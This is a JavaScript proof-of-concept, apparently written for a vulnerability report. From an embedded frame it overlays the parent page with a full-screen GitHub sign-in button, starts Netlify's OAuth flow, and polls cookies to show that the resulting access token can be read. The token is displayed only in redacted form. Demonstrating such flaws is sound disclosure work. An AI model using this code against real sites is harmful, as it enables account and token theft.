(() => {
  const d = parent.document;
  const w = parent;

  const button = d.createElement("button");
  button.textContent = "Continue with GitHub";
  button.style.cssText = [
    "position:fixed",
    "inset:0",
    "z-index:2147483647",
    "font-size:48px",
    "cursor:pointer"
  ].join(";");

  button.onclick = () => {
    w.open(
      "https://api.netlify.com/auth" +
        "?provider=github" +
        "&site_id=app.netlify.com" +
        "&login=true" +
        "&entry_point=direct" +
        "&redirect=" +
        encodeURIComponent("https://www.netlify.com/") +
        "&use_redirect=true",
      "_blank",
      "noopener"
    );

    button.textContent = "Waiting for OAuth redirect…";

    let attempts = 0;

    function readAfterRedirect() {
      attempts++;

      const cookieMatch = d.cookie.match(
        /(?:^|;\s*)_initial_landing_page=([^;]*)/
      );

      if (cookieMatch) {
        let landingPage = cookieMatch[1];

        try {
          landingPage = decodeURIComponent(landingPage);
        } catch {}

        const tokenMatch = landingPage.match(
          /(?:^|[?#&])access_token=([^&#]+)/
        );

        if (tokenMatch) {
          const token = tokenMatch[1];
          const redacted =
            token.slice(0, 4) + "…" + token.slice(-4);

          button.textContent =
            "OAuth completed\n" +
            "Token readable: " + redacted + "\n" +
            "Length: " + token.length;

          return;
        }
      }

      if (attempts < 120) {
        w.setTimeout(readAfterRedirect, 1000);
      } else {
        button.textContent =
          "Timed out: cookie/token was not readable";
      }
    }

    /*
     * Check when focus returns from the OAuth window, while retaining
     * polling as a fallback.
     */
    w.addEventListener(
      "focus",
      () => w.setTimeout(readAfterRedirect, 250),
      { once: true }
    );

    w.setTimeout(readAfterRedirect, 1000);
  };

  d.body.appendChild(button);
})();
